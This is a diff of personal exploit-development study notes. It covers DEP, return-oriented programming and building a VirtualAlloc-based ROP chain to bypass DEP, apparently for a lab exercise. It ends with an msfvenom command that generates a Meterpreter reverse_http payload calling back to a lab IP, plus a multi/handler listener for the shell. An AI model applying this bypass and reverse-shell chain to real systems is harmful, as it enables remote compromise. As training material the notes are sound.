@@ -1,7 +1,12 @@
 ---
 
 ---
+[[#DEP Theory]]
+[[#Return Oriented Programming]]
+[[#Gadget Selection]]
+[[#Bypassing DEP]]
 # DEP Theory
+
 DEP requires a compatible CPU and sets the NX (non-executable) bit on sections of .data, as opposed to .code/.text sections, preventing data injections from being ran.
 
 nX (non-Executable bit) : Enforces DEP, can be set from /NoExecute, boot.ini, bcdedit.exe
@@ -204,8 +209,61 @@ The next value on the stack we need is a return address to our future shellcode 
 	
 	
 ### Pushing Arguments
-Push the arguments required by VirtualAlloc to the next 4 stack positions in the skeleton. These being:
-lpAddress: shellcode address
+Push the arguments required by VirtualAlloc to the next 4 stack positions in the skeleton. These being: lpAddress: shellcode address
 dwSize: 0x01
 flAllocationType: 0x1000
 flProtect: 0x40
+
+1. Push (projected) shellcode address into lpAddress:
+	1. Reuse `inc esi` gadgets to increase esi (our makeshift stack pointer) by 4, to the new argument address
+	2. Move esi value into another register for arithmetic
+	- Remember we can push dummy values on the stack to negate extraneous pops
+	3. Subtract -0x20c (4 more than the -0x210 that the value pushed into the return address value 4 addresses up)
+	4. `mov dword ptr [esi], eax`
+	5. Test the gadget with `dd eax L4` at the end to confirm it points to our shellcode buffer string
+
+2. Push 0x00000001 into dwSize
+	1. Increment esi by 4
+	2. Avoid null bytes by pushing a -1 and negating it
+	3. Test the gadget and ensure 0x00000001 got pushed
+
+3. Push 0x1000 into flAllocationType
+	1. Increment esi by 4
+	2. Avoid null bytes, creatively, since 0x1000 and its negation of 0xfffff000 both have null bytes
+		- Clue: `? 1000 - 60606060 = ...` `? 60606060 + ... = 1000` adding together two registers to get the needed value of 0x1000
+	1. Test the gadget and ensure 0x00001000 got pushed
+
+4. Push 0x40 into flProtect
+	1. Increment esi by 4
+	2. Repeat adding technique from last step OR try a negation on -0x40 OR a sub -0x40 from 0
+	3. Test the gadget and ensure 0x00000040 and all other arguments are pushed properly
+
+### Executing Virtual Alloc
+VirtualAlloc's address, the following return address to shellcode, and the arguments for VirtualAlloc have all been pushed. Finally, call VirtualAlloc itself, changing the protections of the projected shellcode address, and return to the start of a dummy shellcode buffer.
+
+1. Align esp to our stack address pointer to VirtualAlloc
+	- Gadgets that modify esp directly are rare, but we can find `mov esp, ebp ; pop ebp ; ret` everywhere. We need to modify ebp so we can use the previous instruction
+	1. esi still holds the address of our last push to flProtect, move and decrement this to get the VirtualAlloc address.
+	- Try adding a large value instead of adding a small value, since overflowed arithmetic will be dropped off the 32 bit register
+	2. Move eax value into ebp. ie. `xchg eax, ebp ; ret`
+	3. Use the `move esp, ebp ; ...` gadget from above and compensate for the `pop ebp` side effect
+	4. Test chain, first ensure that the eax arithmetic leads to the VirtualAlloc address, then continue to ensure this ends up being returned to after its written to esp
+	- `bp 0x... ".if @eax = 0x40 {} .else {gc}"` : use this to break on a frequently used rop gadget only when a condition is met, in this case, we break on the flProtect iteration by checking for its pushed value in eax.
+
+2. Check memory protections of the shellcode address before/after VirtualAlloc call
+
+3. Align shellcode to offset used in ROP chain
+	- This can be done via changing the offset in the ROP chain or by adding padding to the input so that our shellcode will start at our projected position.
+	1. Calculate and add needed padding / or change coded offset
+	2. Test with dummy shellcode string
+
+
+### Getting a Reverse Shell
+With a dummy buffer in place of the shellcode, generate a real shellcode with msfvenom, expand the size of our shellcode space in the exploit, and replace it with the new shellcode to get a reverse shell.
+
+1. Generate shellcode
+	1. `msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 LPORT=8080 -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode`
+2. Increase the size of the shellcode buffer to fit the shellcode
+	1. Luckily, we can increase the shellcode buffer size in the python script (from 0x400 to 0x600) without breaking the exploit
+3. Replace the dummy shellcode with the generated shellcode
+4. Run `msfconsole` with `use multi/handler` and throw the exploit. `getuid` on the shell.
